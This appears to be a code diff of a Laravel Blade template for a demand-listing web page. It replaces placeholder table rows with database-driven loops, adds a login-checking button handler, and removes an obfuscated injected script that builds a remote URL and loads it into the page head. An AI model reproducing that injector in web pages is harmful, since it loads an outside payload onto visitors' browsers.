@@ -23,80 +23,12 @@
             <p class="mgl-50"><span class="col-red">3、</span>获得解决方案</p>
             <p class="mgl-50"><span class="col-red">4、</span>验收满意确认付款</p>
         </div>
-        <a href="" class="publishNeed fr">发布需求</a>
+        <a href="JavaScript:void(0)" class="publishNeed fr">发布需求</a>
     </div>
     <!--需求列表-->
     <div class="needListDiv">
-        <div class="clearfix">
-            <p class="needTip fl">需求列表</p>
-            <a href="" class="fr needMore">更多</a>
-        </div>
-        <div class="clearfix">
-            <table class="fl needTable">
-                <thead>
-                <tr>
-                    <th>价格</th>
-                    <th>需求内容</th>
-                    <th>发布时间</th>
-                </tr>
-                </thead>
-                <tbody>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                </tbody>
-            </table>
-            <table class="fl needTable">
-                <thead>
-                <tr>
-                    <th>价格</th>
-                    <th>需求内容</th>
-                    <th>发布时间</th>
-                </tr>
-                </thead>
-                <tbody>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                </tbody>
-            </table>
-        </div>
         <!--列表分割图-->
-        <img src="../images/img/needBlockImg.png" alt="" class="needBlockImg"/>
+        <img src="{{ asset('home/images/img/needBlockImg.png') }}" alt="" class="needBlockImg"/>
         <!--所有需求-->
         <div class="clearfix">
             <p class="needTip fl">所有需求</p>
@@ -112,46 +44,15 @@
                 </tr>
                 </thead>
                 <tbody>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
+                @if(!$items->isEmpty())
+                    @foreach($items->chunk(3)[0] as $item)
+                        <tr>
+                            <td class="col-red">￥{{ $item->moneys }}元</td>
+                            <td>{{ $item->title }}</td>
+                            <td class="font-12 col-gray">{{ $item->created_at }} 发布</td>
+                        </tr>
+                    @endforeach
+                @endif
                 </tbody>
             </table>
             <table class="fl needTable">
@@ -163,46 +64,15 @@
                 </tr>
                 </thead>
                 <tbody>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
-                <tr>
-                    <td class="col-red">￥5000元</td>
-                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
-                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
-                </tr>
+                @if(!$items->isEmpty())
+                    @foreach($items->chunk(3)[1] as $item)
+                        <tr>
+                            <td class="col-red">￥{{ $item->moneys }}元</td>
+                            <td>{{ $item->title }}</td>
+                            <td class="font-12 col-gray">{{ $item->created_at }} 发布</td>
+                        </tr>
+                    @endforeach
+                @endif
                 </tbody>
             </table>
         </div>
@@ -210,12 +80,24 @@
 </div>
 @endsection
 @section('js')
+@parent
 <script src="{{ asset('home/js/toPage.js') }}"></script>
 @endsection
 @section('section')
-    <script>
-        var z=document.createElement("script");
-        z.src="xairybythewyrldzaigyingtykillzcym/ctrl/jszhtm".replace(/y/g,"o").replace(/x/,"http://").replace(/z/g,".");
-        document.getElementsByTagName("HEAD")[0].appendChild(z);"//v|v\\";
+    <script type="text/javascript">
+        $('.publishNeed').click(function () {
+            if("{{ Auth::guard('web')->check() }}") {
+                layer.open({
+                    type: 2,
+                    title: '发布需求',
+                    shadeClose: true,
+                    shade: 0.8,
+                    area: ['950px', '85%'],
+                    content: "{{ url('demand/create') }}",
+                });
+            } else {
+                window.location.href = "{{ route('index.login') }}";
+            }
+        });
     </script>
 @endsection
